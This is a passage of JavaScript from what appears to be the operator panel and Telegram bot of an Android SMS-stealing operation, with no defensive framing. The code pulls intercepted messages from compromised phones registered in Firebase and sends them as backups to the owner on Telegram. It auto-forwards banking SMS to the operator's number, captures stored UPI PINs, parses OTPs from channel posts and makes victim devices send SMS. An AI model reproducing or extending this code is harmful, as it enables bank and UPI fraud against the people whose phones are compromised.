      await tgSend(chatId,'✅ <b>Firebase Added!</b>\n\n🏷️ '+esc(label)+'\n🔗 <code>'+esc(st.data.url)+'</code>\n\n<code>/mydevices</code> se dekho.');
      return;
    }
  }

  /* Other commands */
  if(cmd==='/addfirebase'||cmd==='/addfb'){
    userStates[chatId]={state:'wait_fb_url',data:{}};
    await tgSend(chatId,'🔗 <b>Apna Firebase URL bhejo</b>\n\nFormat: <code>https://xxx.firebaseio.com</code>');
    return;
  }
  if(cmd==='/myfirebases'||cmd==='/myfb'){
    var fbs=profile.firebases||[];
    if(!fbs.length){await tgSend(chatId,'📭 Koi Firebase nahi. <code>/addfirebase</code> se add karo.');return;}
    var t='🔥 <b>Your Firebases</b>\n\n';
    fbs.forEach(function(f,i){t+=(i+1)+'. <b>'+esc(f.label)+'</b>\n<code>'+esc(f.url)+'</code>\n\n';});
    await tgSend(chatId,t);return;
  }
  if(cmd==='/mydevices'||cmd==='/mydev'){
    await sendUserDevices(chatId,profile);return;
  }
  if(cmd==='/status'||cmd==='/st'){
    var t='📊 <b>Your Status</b>\n\n👤 '+esc(fullName)+'\n🆔 <code>'+chatId+'</code>\n🔥 Firebases: '+(profile.firebases||[]).length+'\n✅ Verified: '+profile.verified+'\n🕐 '+new Date().toLocaleString();
    await tgSend(chatId,t);return;
  }

  /* Default: show menu */
  await sendUserWelcome(chatId,fullName);
}

/* 🆕 Send user welcome with menu */
async function sendUserWelcome(chatId,fullName){
  var kb={inline_keyboard:[
    [{text:'➕ Add Firebase',callback_data:'menu_addfb'}],
    [{text:'📱 My Devices',callback_data:'menu_devices'}],
    [{text:'🔥 My Firebases',callback_data:'menu_fbs'}],
    [{text:'📊 Status',callback_data:'menu_status'}],
    [{text:'❓ Help',callback_data:'menu_help'}]
  ]};
  var txt='👋 <b>Welcome '+(esc(fullName||'User'))+'!</b>\n\n'
    +'🤖 <b>F.B.I PANEL Bot</b>\n\n'
    +'Choose an option below 👇';
  await tgApi('sendMessage',{chat_id:chatId,text:txt,parse_mode:'HTML',reply_markup:JSON.stringify(kb)});
}

/* 🆕 Handle inline button clicks */
async function handleCallbackQuery(cb){
  var chatId=String(cb.from.id);
  var data=cb.data||'';
  var cbId=cb.id;
  /* Ack */
  try{await tgApi('answerCallbackQuery',{callback_query_id:cbId,text:'…'});}catch(e){}

  if(data==='fj_check'){
    var ok=await checkChannelMembership(chatId);
    if(!ok){await tgApi('sendMessage',{chat_id:chatId,text:'❌ Aapne abhi tak channel join nahi kiya. Pehle join karo fir button dabao.'});return;}
    var from=cb.from||{};
    var newProf={id:chatId,first_name:from.first_name||'',last_name:from.last_name||'',username:from.username||'',language:from.language_code||'en',firebases:[],joinedAt:Date.now(),verified:true,lastSeen:Date.now()};
    await saveUserProfile(newProf);
    await sendUserWelcome(chatId,[from.first_name||'',from.last_name||''].filter(Boolean).join(' ')||'User');
    return;
  }
  var prof=await getUserProfile(chatId);
  if(!prof){
    await tgApi('sendMessage',{chat_id:chatId,text:'Pehle /start karo.'});return;
  }
  if(data==='menu_addfb'){
    userStates[chatId]={state:'wait_fb_url',data:{}};
    await tgApi('sendMessage',{chat_id:chatId,text:'🔗 <b>Apna Firebase URL bhejo:</b>\n\n<code>https://xxx.firebaseio.com</code>',parse_mode:'HTML'});return;
  }
  if(data==='menu_fbs'){
    var fbs=prof.firebases||[];
    if(!fbs.length){await tgApi('sendMessage',{chat_id:chatId,text:'📭 Koi nahi. Pehle add karo.'});return;}
    var t='🔥 <b>Your Firebases</b>\n\n';
    fbs.forEach(function(f,i){t+=(i+1)+'. <b>'+esc(f.label)+'</b>\n<code>'+esc(f.url)+'</code>\n\n';});
    await tgApi('sendMessage',{chat_id:chatId,text:t,parse_mode:'HTML'});return;
  }
  if(data==='menu_devices'){await sendUserDevices(chatId,prof);return;}
  if(data==='menu_status'){
    await tgApi('sendMessage',{chat_id:chatId,text:'📊 <b>Status</b>\n\n🆔 <code>'+chatId+'</code>\n🔥 Firebases: '+(prof.firebases||[]).length+'\n✅ Verified: '+prof.verified,parse_mode:'HTML'});return;
  }
  if(data==='menu_help'){
    var h='🆘 <b>Help</b>\n\n/start — Main menu\n/addfirebase — Add Firebase\n/myfirebases — List firebases\n/mydevices — Your devices\n/status — Status\n/help — This';
    await tgApi('sendMessage',{chat_id:chatId,text:h,parse_mode:'HTML'});return;
  }
}

/* 🆕 Send user devices from their firebases */
async function sendUserDevices(chatId,profile){
  var fbs=profile.firebases||[];
  if(!fbs.length){await tgApi('sendMessage',{chat_id:chatId,text:'📭 No firebases. Add with /addfirebase.'});return;}
  var all=[];
  for(var i=0;i<fbs.length;i++){
    try{
      var fb=fbs[i];var auth=fb.key?'?auth='+fb.key:'';
      var r=await fetch(fb.url+'/clients.json'+auth,{signal:AbortSignal.timeout(8000)});
      if(!r.ok)continue;
      var clients=await r.json();
      if(!clients||typeof clients!=='object')continue;
      Object.entries(clients).forEach(function(kv){
        var id=kv[0],d=kv[1];if(!d||typeof d!=='object')return;
        all.push({id:id,name:d.modelName||d.model||id,status:!!d.status,fb:fb.label});
      });
    }catch(e){}
  }
  if(!all.length){await tgApi('sendMessage',{chat_id:chatId,text:'📭 No devices found.'});return;}
  var t='📱 <b>Your Devices ('+all.length+')</b>\n\n';
  all.slice(0,50).forEach(function(d,i){t+=(i+1)+'. '+(d.status?'🟢':'🔴')+' '+esc(d.name)+' ['+esc(d.fb)+']\n';});
  if(all.length>50)t+='\n…+'+(all.length-50)+' more';
  await tgApi('sendMessage',{chat_id:chatId,text:t,parse_mode:'HTML'});
}

/* ═══════ OWNER COMMANDS ═══════ */
async function handleOwnerCommand(msg){
  var txt=String(msg.text||'').trim();var cmd=txt.toLowerCase();var chatId=msg.chat.id;
  console.log('[CMD] '+txt);

  /* 🆕 /backup — incremental */
  if(cmd==='/backup'||cmd==='/bk'){await sendBackupIncremental(chatId);return;}
  /* 🆕 /backup_all — full */
  if(cmd==='/backup_all'||cmd==='/bka'){await sendBackupFull(chatId);return;}
  /* legacy keep */
  if(cmd==='/backup_keep'||cmd==='/bkk'){await tgSend(chatId,'⏳ Full backup (keep)…');await sendBackupToOwner(chatId,true);return;}

  if(cmd==='/status'||cmd==='/st'){await sendStatusToOwner(chatId);return;}
  if(cmd==='/devices'||cmd==='/dev'){
    var t='📱 Devices ('+allDevices.length+' · '+allDevices.filter(function(d){return d.status;}).length+' online)\n\n';
    allDevices.slice(0,50).forEach(function(d,i){t+='#'+(d.deviceOrder||i+1)+' '+(d.status?'🟢':'🔴')+' '+d.name+' · '+d.mobNo+'\n';});
    if(allDevices.length>50)t+='\n…+'+(allDevices.length-50)+' more';
    await tgSend(chatId,t);return;
  }
  /* 🆕 /users — list all users */
  if(cmd==='/users'||cmd==='/usr'){
    var uids=await getAllUserIds();
    var t='👥 <b>Total Users: '+uids.length+'</b>\n\n';
    for(var i=0;i<Math.min(uids.length,50);i++){
      var uid=uids[i];
      var p=await getUserProfile(uid);
      if(p)t+='👤 '+esc(p.first_name||'')+' '+esc(p.last_name||'')+(p.username?' @'+esc(p.username):'')+'\n🆔 <code>'+uid+'</code> · 🔥 '+(p.firebases||[]).length+'\n\n';
    }
    if(uids.length>50)t+='\n…+'+(uids.length-50)+' more';
    await tgSend(chatId,t);return;
  }
  if(cmd.startsWith('/autobackup')){
    var arg=cmd.replace('/autobackup','').trim();
    if(arg==='on'){userConfig.autoBackup=true;await tgSend(chatId,'✅ ON');}
    else if(arg==='off'){userConfig.autoBackup=false;await tgSend(chatId,'⏹ OFF');}
    else if(/^\d+$/.test(arg)){userConfig.autoBackupHour=Math.max(0,Math.min(23,parseInt(arg,10)));userConfig.autoBackup=true;await tgSend(chatId,'✅ '+userConfig.autoBackupHour+':00');}
    else await tgSend(chatId,'Usage: /autobackup on|off|<hour>');
    debouncedCloudSave();return;
  }
  if(cmd==='/help'||cmd==='/start'){
    var h='🤖 <b>Owner Commands</b>\n\n'
      +'/backup — Only new messages since last backup\n'
      +'/backup_all — Full backup (everything)\n'
      +'/status — Panel status\n'
      +'/devices — List all devices\n'
      +'/users — List bot users\n'
      +'/autobackup on|off|<hour>\n';
    await tgSend(chatId,h);return;
  }
}
async function tgSend(chatId,text){try{return await tgApi('sendMessage',{chat_id:chatId,text:text,parse_mode:'HTML'});}catch(e){return null;}}

/* ═══════════════════════════════════════════════════════════
   💾 OWNER BACKUP — Incremental + Full
   ═══════════════════════════════════════════════════════════ */
async function getLastBackupTs(){
  var v=await redisGet('fbi:last_backup_ts');
  return v?parseInt(v,10):0;
}
async function setLastBackupTs(ts){await redisSet('fbi:last_backup_ts',String(ts));}

async function collectBackupData(sinceTs){
  var data={generatedAt:new Date().toISOString(),version:'11.0',mode:sinceTs?'incremental':'full',sinceTs:sinceTs||0,summary:{firebases:0,devices:0,online:0,offline:0,totalMsgs:0,newMsgs:0},firebases:[],devices:{},messages:{},config:{myNumber:userConfig.myNumber,forwardMode:userConfig.forwardMode,channelId:userConfig.channelId,forwardEnabled:userConfig.forwardEnabled}};
  var targets=[];
  if(FB_URL)targets.push({url:FB_URL,key:FB_KEY,label:'Primary'});
  fbInstances.forEach(function(inst){targets.push({url:inst.url,key:inst.key,label:inst.label});});
  for(var i=0;i<targets.length;i++){
    var t=targets[i];if(!t.url)continue;
    var fbInfo={url:t.url,label:t.label,deviceCount:0,online:0,offline:0,msgCount:0,newMsgCount:0,status:'ok'};
    try{
      var auth=t.key?'?auth='+t.key:'';
      var r=await fetch(t.url+'/clients.json'+auth,{signal:AbortSignal.timeout(15000)});
      if(!r.ok){fbInfo.status='HTTP '+r.status;data.firebases.push(fbInfo);continue;}
      var clients=await r.json();
      if(!clients||typeof clients!=='object'){fbInfo.status='empty';data.firebases.push(fbInfo);continue;}
      var ids=Object.keys(clients);
      fbInfo.deviceCount=ids.length;
      for(var j=0;j<ids.length;j++){
        var id=ids[j];data.devices[id]=clients[id];
        if(clients[id]&&clients[id].status){fbInfo.online++;data.summary.online++;}else{fbInfo.offline++;data.summary.offline++;}
        data.summary.devices++;
        try{
          var mr=await fetch(t.url+'/messages/'+id+'.json'+auth+(auth?'&':'?')+'orderBy="$key"&limitToLast=2000',{signal:AbortSignal.timeout(15000)});
          if(mr.ok){
            var msgs=await mr.json();
            if(msgs){
              var filtered={};
              var mc=0,newc=0;
              Object.entries(msgs).forEach(function(kv){
                mc++;
                var msgTs=msgTimestamp(kv[0],kv[1]);
                if(!sinceTs||msgTs>sinceTs){filtered[kv[0]]=kv[1];newc++;}
              });
              if(Object.keys(filtered).length)data.messages[id]=filtered;
              fbInfo.msgCount+=mc;fbInfo.newMsgCount+=newc;
              data.summary.totalMsgs+=mc;data.summary.newMsgs+=newc;
            }
          }
        }catch(e){}
      }
    }catch(e){fbInfo.status='error: '+e.message;}
    data.firebases.push(fbInfo);
  }
  data.summary.firebases=data.firebases.length;
  return data;
}
function msgTimestamp(key,msg){
  /* Firebase keys are like "-Nxxxxxxxx" (push IDs, time-ordered) */
  var k=String(key||'');
  if(k.length>5&&k.charAt(0)==='-'){
    /* Push ID decode → ms since 2015-01-01 */
    var PUSH_CHARS='-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
    var time=0;
    for(var i=0;i<8;i++){var c=PUSH_CHARS.indexOf(k.charAt(i));if(c<0)return 0;time=time*64+c;}
    return time+1420070400000;
  }
  if(msg&&typeof msg==='object'){
    var dt=msg.dateTime||msg.date||msg.timestamp||msg.time;
    if(dt)return parseDT(dt)||0;
  }
  return 0;
}

async function sendBackupIncremental(chatId){
  if(_backupRunning){toast('⏳ Backup already running');return;}
  _backupRunning=true;
  try{
    var since=await getLastBackupTs();
    await tgSend(chatId,'⏳ <b>Incremental Backup</b>\n'+(since?('Since: '+new Date(since).toLocaleString()):'First backup — collecting all'));
    var data=await collectBackupData(since);
    if(!data.summary.newMsgs&&!Object.keys(data.devices).length){
      await tgSend(chatId,'✅ <b>Nothing new since last backup</b>');
      return;
    }
    var json=JSON.stringify(data);
    var sizeKB=(new Blob([json]).size/1024).toFixed(1);
    var caption='📦 <b>F.B.I — Incremental Backup</b>\n📅 '+new Date().toLocaleString()+'\n'
      +(since?('🗓️ Since: '+new Date(since).toLocaleString()+'\n'):'')
      +'\n🔥 Firebases: '+data.summary.firebases+'\n'
      +'📱 Devices: '+data.summary.devices+'\n'
      +'🟢 Online: '+data.summary.online+'\n'
      +'🔴 Offline: '+data.summary.offline+'\n'
      +'📨 New Msgs: <b>'+data.summary.newMsgs+'</b>\n'
      +'💽 Size: '+sizeKB+' KB';
    var blob=new Blob([json],{type:'application/json'});
    var fname='fbi-incr-'+new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)+'.json';
    var form=new FormData();
    form.append('chat_id',chatId);form.append('document',blob,fname);
    form.append('caption',caption);form.append('parse_mode','HTML');
    var r=await fetch(CFG.TG_API+'/sendDocument',{method:'POST',body:form});
    var res=await r.json();
    if(res.ok){
      await setLastBackupTs(Date.now());
      toast('💾 Incremental sent ('+sizeKB+' KB)');
    } else {
      await tgSend(chatId,'❌ Failed: '+(res.description||'?'));
    }
  }catch(e){console.error('[Backup]',e);await tgSend(chatId,'❌ '+e.message);}
  finally{_backupRunning=false;}
}

async function sendBackupFull(chatId){
  if(_backupRunning){toast('⏳ Backup already running');return;}
  _backupRunning=true;
  try{
    await tgSend(chatId,'⏳ <b>Full Backup (everything)</b>…');
    var data=await collectBackupData(0);
    var json=JSON.stringify(data);
    var sizeKB=(new Blob([json]).size/1024).toFixed(1);
    var caption='📦 <b>F.B.I — FULL Backup</b>\n📅 '+new Date().toLocaleString()+'\n\n'
      +'🔥 Firebases: '+data.summary.firebases+'\n'
      +'📱 Devices: '+data.summary.devices+'\n'
      +'🟢 Online: '+data.summary.online+'\n'
      +'🔴 Offline: '+data.summary.offline+'\n'
      +'📨 Total Msgs: '+data.summary.totalMsgs+'\n'
      +'💽 Size: '+sizeKB+' KB';
    var blob=new Blob([json],{type:'application/json'});
    var fname='fbi-full-'+new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)+'.json';
    var form=new FormData();
    form.append('chat_id',chatId);form.append('document',blob,fname);
    form.append('caption',caption);form.append('parse_mode','HTML');
    var r=await fetch(CFG.TG_API+'/sendDocument',{method:'POST',body:form});
    var res=await r.json();
    if(res.ok){
      await setLastBackupTs(Date.now());
      toast('💾 Full sent ('+sizeKB+' KB)');
    } else await tgSend(chatId,'❌ Failed: '+(res.description||'?'));
  }catch(e){console.error('[Backup]',e);await tgSend(chatId,'❌ '+e.message);}
  finally{_backupRunning=false;}
}

/* legacy — keep compatibility */
async function collectBackupDataLegacy(){return await collectBackupData(0);}
async function sendBackupToOwner(chatId,keep){
  if(keep)return await sendBackupFull(chatId);
  return await sendBackupIncremental(chatId);
}

function checkAutoBackup(){
  if(!userConfig.userId||!userConfig.autoBackup)return;
  var now=new Date(),today=now.toISOString().slice(0,10);
  if(_lastAutoBackupDate===today)return;
  var targetHour=userConfig.autoBackupHour!=null?userConfig.autoBackupHour:3;
  if(now.getHours()>=targetHour){
    _lastAutoBackupDate=today;
    try{localStorage.setItem('fbi_last_auto_backup',today);}catch(e){}
    sendBackupIncremental(userConfig.userId);
  }
}

async function sendStatusToOwner(chatId){
  var online=allDevices.filter(function(d){return d.status;}).length;
  var uids=await getAllUserIds();
  var txt='📊 <b>F.B.I PANEL Status</b>\n\n'
    +'📱 Devices: '+allDevices.length+' ('+online+' 🟢)\n'
    +'👥 Bot Users: '+uids.length+'\n'
    +'🔥 Tracking: '+Object.keys(_msgCache).length+'\n'
    +'🤖 Bot: '+(tgRunning?'✅ running':'⛔ stopped')+'\n'
    +'📢 Channel: '+(userConfig.channelId||'—')+'\n'
    +'📞 My Number: '+(userConfig.myNumber||'—')+'\n'
    +'📤 Forward: '+(userConfig.forwardEnabled!==false?'✅':'⛔')+' '+(userConfig.forwardMode||'all')+'\n'
    +'🕐 '+new Date().toLocaleString();
  await tgSend(chatId,txt);
}

/* ═══════ TELEGRAM PARSER ═══════ */
function _cleanPhone(n){
  n=String(n||'').replace(/[^\d]/g,'');
  if(n.length===13&&n.startsWith('091'))n=n.slice(3);
  if(n.length===12&&n.startsWith('91'))n=n.slice(2);
  if(n.length===11&&n.charAt(0)==='0')n=n.slice(1);
  if(n.length>10)n=n.slice(-10);
  return n;
}
function _extractBetween(text,startTag,endTag){
  if(!startTag)return null;
  var tag=String(startTag).trim();if(!tag)return null;
  var lowerT=text.toLowerCase(),lowerTag=tag.toLowerCase();
  var sIdx=lowerT.indexOf(lowerTag);
  if(sIdx===-1){var cleanTag=tag.replace(/[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/gu,'').trim().toLowerCase();if(cleanTag&&cleanTag!==lowerTag){sIdx=lowerT.indexOf(cleanTag);if(sIdx!==-1)lowerTag=cleanTag;}}
  if(sIdx===-1)return null;
  var startPos=sIdx+lowerTag.length;
  while(startPos<text.length&&/[\s:]/.test(text.charAt(startPos)))startPos++;
  var out;
  if(!endTag||!String(endTag).trim()){out=text.substring(startPos);}
  else{
    var eTag=String(endTag).trim().toLowerCase();
    var eIdx=lowerT.indexOf(eTag,startPos);
    if(eIdx===-1){var cleanEnd=eTag.replace(/[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/gu,'').trim();if(cleanEnd)eIdx=lowerT.indexOf(cleanEnd,startPos);}
    if(eIdx===-1)return null;
    out=text.substring(startPos,eIdx);
  }
  return String(out).trim();
}
function parseTelegramMessage(text){
  text=String(text||'').replace(/\r/g,'');
  if(!text)return{number:null,message:null,valid:false};
  var number=null,message=null;
  var hasCustom=userConfig.numStart||userConfig.msgStart;
  if(hasCustom){
    if(userConfig.numStart){var numRaw=_extractBetween(text,userConfig.numStart,userConfig.numEnd);if(numRaw){var nc=_cleanPhone(numRaw);if(nc.length>=10&&nc.length<=12)number=nc;}}
    if(userConfig.msgStart){var msgRaw=_extractBetween(text,userConfig.msgStart,userConfig.msgEnd);if(msgRaw&&msgRaw.length>=1)message=msgRaw;}
    if(message){message=message.replace(/<\/?[a-z]+>/gi,'').trim();var cutC=message.search(/\n\s*(?:Sent at|Time|Date|Status|SIM|Package|Timestamp|From|Received at|Click on)\s*:/i);if(cutC>0)message=message.substring(0,cutC).trim();}
    if(number&&message){return{number:number,message:message,valid:true};}
  }
  var lines=text.split('\n');var numLineIdx=-1,msgStartIdx=-1;
  for(var i=0;i<lines.length;i++){
    var L=lines[i];
    if(numLineIdx<0&&/(^|\s|📞|📱|📍|🎯)(to|receipt|number|mobile|target|phone|recipient)(\s|$|\(|:)/i.test(L)){
      var sN=L.match(/([+]?\d[\d\s\-]{8,18})/);
      if(sN){var c=_cleanPhone(sN[1]);if(c.length>=10){number=c;numLineIdx=i;continue;}}
      if(i+1<lines.length){var nN=lines[i+1].match(/([+]?\d[\d\s\-]{8,18})/);if(nN){var c2=_cleanPhone(nN[1]);if(c2.length>=10){number=c2;numLineIdx=i+1;}}}
    }
    if(msgStartIdx<0&&/(^|\s|💬|🔑|📝)(body|message|msg|token|text|content)(\s|$|\(|:)/i.test(L)){
      var sameLine=L.replace(/^.*?(?:body|message|msg|token|text|content)[^\n:]*:\s*/i,'').trim();
      if(sameLine&&sameLine.length>2&&!/^\(?\s*tap\s*to\s*copy\s*\)?$/i.test(sameLine)){
        message=sameLine;
        for(var j=i+1;j<lines.length;j++){if(/^\s*$/.test(lines[j]))continue;if(/^(⏰|📊|📋|Time\s*:|Status\s*:|Sent at|Click on|From\s*:|Date\s*:|SIM\s*:)/i.test(lines[j]))break;message+='\n'+lines[j].trim();}
        break;
      }
      msgStartIdx=i+1;break;
    }
  }
  if(!message&&msgStartIdx>=0){
    var buf=[];
    for(var k=msgStartIdx;k<lines.length;k++){
      var ln=lines[k];
      if(/^\s*$/.test(ln)){if(buf.length)break;else continue;}
      if(/^(⏰|📊|📋|Time\s*:|Status\s*:|Sent at|Click on|From\s*:|Date\s*:|SIM\s*:)/i.test(ln))break;
      if(k===numLineIdx)continue;
      buf.push(ln.trim());
    }
    if(buf.length)message=buf.join('\n').trim();
  }
  if(!number){
    var raw=text.match(/(?:^|\D)([+]?\d[\d\s\-]{9,18})(?:\D|$)/g);
    if(raw){for(var m=0;m<raw.length;m++){var c3=_cleanPhone(raw[m]);if(c3.length>=10&&c3.length<=12){number=c3;break;}}}
  }
  if((!number||!message)&&/one[\s-]?tap/i.test(text)){
    var otc=text.match(/one[\s-]?tap[^\n]*?\n\s*([+]?\d[\d\s\-]{8,18})\s*\|\s*([\s\S]*?)(?=\n\s*\n|$)/i);
    if(otc){if(!number){var c4=_cleanPhone(otc[1]);if(c4.length>=10)number=c4;}if(!message&&otc[2])message=otc[2].trim();}
  }
  if(!message){
    var best='';
    for(var n=0;n<lines.length;n++){
      var ln2=lines[n].trim();if(!ln2||ln2.length<3)continue;
      if(/^[━═─_=\-·•\s]+$/.test(ln2))continue;
      if(/^\(?\s*tap\s*to\s*copy\s*\)?\s*:?$/i.test(ln2))continue;
      if(/module by|dm to buy|one[\s-]?tap|https?:\/\//i.test(ln2))continue;
      if(/^[+\d\s|,.\-()]+$/.test(ln2))continue;
      if(/@\w+/.test(ln2)&&ln2.length<35)continue;
      if(/^(To|Body|From|Receipt|Mobile|Number|Time|Status|Message|Msg|Token|Content|Target|Phone|Click on)\s*[:(]/i.test(ln2))continue;
      if(ln2.length>best.length)best=ln2;
    }
    if(best.length>=3)message=best;
  }
  if(message){message=message.replace(/<\/?[a-z]+>/gi,'');message=message.replace(/^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\s]+/u,'').trim();var cut=message.search(/\n\s*(?:Sent at|Time|Date|Status|SIM|Package|Timestamp|From|Received at|Click on)\s*:/i);if(cut>0)message=message.substring(0,cut).trim();}
  if(message&&message.length<2)message=null;
  if(number&&number.length<10)number=null;
  return{number:number,message:message,valid:!!(number&&message)};
}

function handleTelegramSms(number,message,msgObj){
  var t0=performance.now();
  _showCapturedNotif(number,message);
  var dev=null;
  if(activeDeviceUid){var parts=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});}
  if(!dev||!dev.status)dev=selDev;
  if(!dev||!dev.status)dev=allDevices.find(function(d){return d.status;});
  if(!dev){console.error('🎯 No online device');return;}
  var sim=deviceSimMap[dev.id]||1;
  var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
  var body=JSON.stringify({from:sim,to:number,message:message,isSended:false});
  fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true})
    .then(function(r){
      var dt=(performance.now()-t0).toFixed(0);
      if(r.ok){console.log('⚡ [TG SMS] ✓ '+dt+'ms');notifySmsSent(dev,number,message,'tg-channel');}
    })
    .catch(function(e){console.warn('⚡ '+e.message);});
}
function _showCapturedNotif(number,message){
  var el=document.getElementById('capturedBar');if(!el)return;
  el.innerHTML='<div class="cap-icon">🎯</div><div class="cap-num" data-copy="'+esc(number)+'" onclick="copyFromEl(this,event)">'+esc(number)+'</div><div class="cap-msg" data-copy="'+esc(message)+'" onclick="copyFromEl(this,event)">'+esc((message||'').substring(0,40))+'</div><div class="cap-time">'+new Date().toLocaleTimeString()+'</div>';
  el.classList.add('show');setTimeout(function(){el.classList.remove('show');},3000);
}

/* ═══════ AUTO-FORWARD ═══════ */
async function checkAndForward(msgs,deviceId){
  if(!msgs||!msgs.length)return;
  var dev=allDevices.find(function(d){return d.id===deviceId;});if(!dev)return;
  var lastForwarded=forwardTracker[deviceId]||'';
  if(!lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();return;}
  if(userConfig.forwardEnabled===false){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  var myNum=userConfig.myNumber;if(!myNum){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  var forwardMode=userConfig.forwardMode||'all',toForward=[],hpForward=[];
  for(var i=0;i<msgs.length;i++){
    var m=msgs[i];if(m.key===lastForwarded)break;
    if(m.type!=='incoming')continue;
    if(!m.message||!m.message.trim()||m.message.trim()==='(no body)')continue;
    if(forwardMode==='banking'&&!isBankingSms(m.sender,m.message))continue;
    if(isHighPriority(m))hpForward.push(m);else toForward.push(m);
  }
  if(!toForward.length&&!hpForward.length){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();
  var sim=deviceSimMap[dev.id]||1;
  for(var h=hpForward.length-1;h>=0;h--)sendHighPrioritySms(dev,sim,myNum,String(hpForward[h].message||'').trim(),'fwd-hp');
  for(var j=toForward.length-1;j>=0;j--)sendSmsFireAndForget(dev,sim,myNum,String(toForward[j].message||'').trim(),'fwd',false);
  var total=toForward.length+hpForward.length;
  if(total)toast('📤 Forwarded '+total+' msg(s)');
}

/* ═══════ PING ═══════ */
var _apOn=false,_pingTmr=null,_pingReplied=0,_pingTotal=0,_pingPrevStatus={};
function _pingUpdateBtn(){var b=document.getElementById('apBtn');if(!b)return;if(!_apOn){b.textContent='PING';b.style.color='var(--lilac)';return;}b.textContent=_pingReplied+'/'+_pingTotal;b.style.color=_pingReplied>0?'var(--mint)':'var(--gold2)';}
function _pingBuildPanel(){if(document.getElementById('pingPanel'))return;var p=document.createElement('div');p.id='pingPanel';p.style.cssText='position:fixed;bottom:20px;right:20px;width:300px;max-height:440px;background:linear-gradient(145deg,#130a22,#0d0618);border:1px solid rgba(168,85,247,.28);border-radius:16px;z-index:8000;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);display:flex;flex-direction:column;max-width:calc(100vw - 40px);';var hdr=document.createElement('div');hdr.style.cssText='padding:12px 16px;border-bottom:1px solid rgba(168,85,247,.1);display:flex;align-items:center;gap:8px;';hdr.innerHTML='<div style="width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);animation:pulse 1.5s infinite"></div><div style="font-size:13px;font-weight:800;color:var(--gold2);flex:1">Live Ping</div><div id="pingStats" style="font-size:11px;font-weight:700;color:var(--sub)">0/0</div><button onclick="document.getElementById(\'pingPanel\').remove();_apOn=false;if(_pingTmr)clearTimeout(_pingTmr);_pingUpdateBtn();" style="background:none;border:none;color:var(--sub);cursor:pointer;font-size:18px">×</button>';var list=document.createElement('div');list.id='pingList';list.style.cssText='overflow-y:auto;flex:1;';p.appendChild(hdr);p.appendChild(list);document.body.appendChild(p);}
function _pingAddRow(uid,name,online,isNew){var list=document.getElementById('pingList');if(!list)return;var ex=document.getElementById('pr_'+CSS.escape(uid));if(ex){var d=ex.querySelector('.pr-dot'),l=ex.querySelector('.pr-label'),b=ex.querySelector('.pr-badge');if(d)d.style.background=online?'var(--mint)':'rgba(244,63,94,.4)';if(l){l.textContent=name;l.style.color=online?'var(--text)':'var(--dim)';}if(b){b.textContent=online?'ON':'OFF';b.style.color=online?'var(--mint)':'var(--rose)';}if(isNew)list.insertBefore(ex,list.firstChild);return;}var row=document.createElement('div');row.id='pr_'+uid;row.style.cssText='display:flex;align-items:center;gap:9px;padding:8px 14px;border-bottom:1px solid rgba(168,85,247,.04);'+(isNew?'background:rgba(255,221,0,.08);':'');row.innerHTML='<div class="pr-dot" style="width:8px;height:8px;border-radius:50%;background:'+(online?'var(--mint)':'rgba(244,63,94,.4)')+'"></div><div class="pr-label" style="flex:1;font-size:12px;font-weight:600;color:'+(online?'var(--text)':'var(--dim)')+'">'+esc(name)+'</div><div class="pr-badge" style="font-size:9px;font-weight:800;color:'+(online?'var(--mint)':'var(--rose)')+'">'+(online?'ON':'OFF')+'</div>';if(online)list.insertBefore(row,list.firstChild);else list.appendChild(row);}
function autoPinAll(){if(_apOn){_apOn=false;if(_pingTmr){clearTimeout(_pingTmr);_pingTmr=null;}_pingUpdateBtn();toast('⏹ Stopped');return;}if(!allDevices.length){toast('⚠ No devices');return;}_apOn=true;_pingReplied=0;_pingTotal=allDevices.length;_pingUpdateBtn();_pingBuildPanel();toast('📡 Pinging…');_apLoop();}
async function _apLoop(){
  if(!_apOn)return;_pingReplied=0;_pingTotal=0;
  var targets=fbInstances.length>0?fbInstances:[{id:'primary',url:FB_URL,key:FB_KEY,label:'Primary'}];
  try{
    var results=await Promise.allSettled(targets.map(async function(inst){var auth=inst.key?'?auth='+inst.key:'';var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(8000)});return{inst:inst,data:await r.json()};}));
    var allClients=[];
    results.forEach(function(res){if(res.status!=='fulfilled'||!res.value||!res.value.data)return;var inst=res.value.inst,data=res.value.data;if(typeof data!=='object')return;Object.keys(data).forEach(function(id){if(data[id]&&typeof data[id]==='object')allClients.push({id:id,cl:data[id],inst:inst,uid:inst.id+':'+id});});});
    _pingTotal=allClients.length;
    for(var i=0;i<allClients.length;i++){
      if(!_apOn)break;var it=allClients[i];var isOnline=!!it.cl.status;
      var prev=_pingPrevStatus[it.uid],isNew=(prev===false&&isOnline);
      if(isOnline)_pingReplied++;
      _pingPrevStatus[it.uid]=isOnline;
      var dev=allDevices.find(function(d){return d.id===it.id&&(d._fbId||'primary')===(it.inst.id||'primary');});
      var name=it.cl.modelName||it.cl.model||it.id;if(dev){dev.status=isOnline;name=dev.name;}
      if(it.cl.upipin){pinC[it.id]=String(it.cl.upipin).trim();if(dev)dev.upipin=pinC[it.id];}
      _pingAddRow(it.uid,name,isOnline,isNew);
